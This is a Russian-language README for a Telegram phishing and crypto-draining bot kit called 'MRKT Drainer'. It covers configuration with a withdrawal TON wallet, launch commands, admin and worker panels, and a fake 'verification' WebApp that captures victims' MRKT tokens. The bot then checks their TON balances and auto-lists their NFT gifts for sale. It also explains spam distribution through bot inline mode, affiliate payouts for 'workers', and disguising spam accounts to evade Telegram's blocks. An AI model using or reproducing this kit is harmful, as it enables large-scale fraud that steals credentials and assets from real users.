# MRKT Drainer — Инструкция

## Требования

- Python 3.10+
- PM2 (или запуск через `python3 mrkt/bot.py`)
- Домен с SSL для WebApp (фронтенд лежит в `mrkt/frontend/`)
- Пакеты: `pip install aiogram fastapi uvicorn pydantic telethon PySocks httpx opentele`

## Конфиг

Файл `mrkt/config.py`:

```python
BOT_TOKEN = ""           # Токен бота из @BotFather
BOT_USERNAME = ""        # Username бота без @
ADMIN_IDS = [123456]     # Telegram ID администратора
API_ID = 2040            # Telegram API (можно оставить дефолт)
API_HASH = "..."         # Telegram API hash
WITHDRAW_WALLET = ""     # TON-кошелёк для вывода (UQ/EQ)
LOG_CHAT_ID = ""         # ID чата для логов (можно оставить пустым)
WEBAPP_URL = ""          # URL фронтенда (домен с SSL)
PORT = 8081              # Порт FastAPI
```

## Запуск

```bash
# Через PM2:
pm2 start mrkt/bot.py --name mrkt --interpreter python3

# Или напрямую:
python3 mrkt/bot.py
```

Бот поднимает FastAPI на порте из конфига — нужен nginx/reverse proxy на домен.

## Команды

### Админ

| Команда | Описание |
|---------|----------|
| `/admin` | Главная панель. Кошелёк, токены, спам-акки, парсер, feed |
| `/sell` | Просмотр гифтов мамонтов, ручной листинг на продажу |
| `/delete +79001234567` | Удаление аккаунта мамонта по номеру (если сессия жива) |
| `/buyer` | Управление баер-аккаунтом (для вывода через покупку гифтов) |
| `/buyer token` | Установка токена баера |

### Воркер

| Команда | Описание |
|---------|----------|
| `/swag` | Панель воркера. Добавление спам-акков, запуск рассылки, статистика |

### Мамонт

| Команда | Описание |
|---------|----------|
| `/start` | Фишинговая страница — имитация верификации, открывает WebApp |

## Админ-панель (`/admin`)

Кнопки:
- **💳 Кош** — сменить кошелёк вывода
- **🔑 Токены** — список залогиненных мамонтов (токены MRKT API)
- **📱 Управление спам-акками** — список добавленных аккаунтов, удаление
- **🤖 Добавить спам-акк** — добавление через номер/код/2FA или tdata zip
- **▶️ Старт парсер / ⏹ Стоп** — запуск и остановка спам-рассылки
---

## Воркер-панель (`/swag`)

Доступна любому пользователю. При первом вызове — авторегистрация.

Кнопки:
- **🚀 Запустить рассылку** — старт спама с привязанных акков
- **📱 Добавить спам-акк** — привязка акка (номер → код → 2FA)
- **📋 Мои спам-акки** — список своих акков
- **📊 Мои логи** — статистика (сколько логов залетело, заработок)
- **🔗 Моя реферальная ссылка** — уникальная ссылка `t.me/bot?start=spec_xxx`. Мамонт переходит → привязывается к воркеру → воркер получает % с логов

---

## Как работает дрейн

1. Мамонт нажимает `/start` (или переходит по ссылке воркера)
2. Открывается WebApp — фишинг под MRKT верификацию
3. WebApp отправляет `initData` на FastAPI бэкенд
4. Бот получает MRKT-токен мамонта и сохраняет в базу
5. Автоматически проверяется баланс TON и наличие Unique Gifts (NFT)
7. Если есть гифты — автолистинг на продажу (или ручной через `/sell`)

## Инлайн-рассылка

Спам идёт через inline mode бота. Спам-акк пишет в чат `@bot_username slug`, бот генерирует сообщение с кнопкой "Complete verify". Мамонт нажимает → попадает в бота.

Для инлайна нужно:
1. Включить Inline Mode в @BotFather (`/setinline`)
2. Добавить спам-акк в бота
3. Нажать "Запустить рассылку"

## Спам-аккаунты — подготовка

**В этой версии нет автонастройки**, поэтому перед добавлением аккаунта настройте его вручную:

1. **Имя** — поставить что-то типа `MRKT Notify`, `System Alert`
2. **Username** — убрать полностью
3. **Аватарка** — логотип MRKT или подобное
4. **Конфиденциальность:**
   - "Был в сети" → Никто
   - Звонки → Никто
   - Группы → Мои контакты
5. **Отлежка** — новореги ловят спамблок за 3-5 сообщений. Используйте акки с отлежкой от 1+ месяцев
6. **Premium** — сильно снижает шанс мута

### Добавление в бота:
- Через `/admin` → "Добавить спам-акк" → номер → код → 2FA
- Или: отправить `.zip` архив с tdata в чат (формат: `ID_tdata.zip`)

## FAQ

**Q: Бот крашится с `ModuleNotFoundError`**
A: Установите зависимости: `pip install aiogram fastapi uvicorn pydantic telethon PySocks httpx opentele`

**Q: WebApp не открывается**
A: Нужен домен с SSL. Укажите его в `WEBAPP_URL` в конфиге. Настройте nginx reverse proxy на порт бота.

**Q: Мамонт зашёл но токен не сохранился**
A: Проверьте что FastAPI отвечает (порт открыт, nginx проксирует). Смотрите логи: `pm2 logs mrkt`

**Q: Спам-акк ловит мут**
A: Юзайте акки с отлежкой и Premium. Новореги банятся мгновенно.
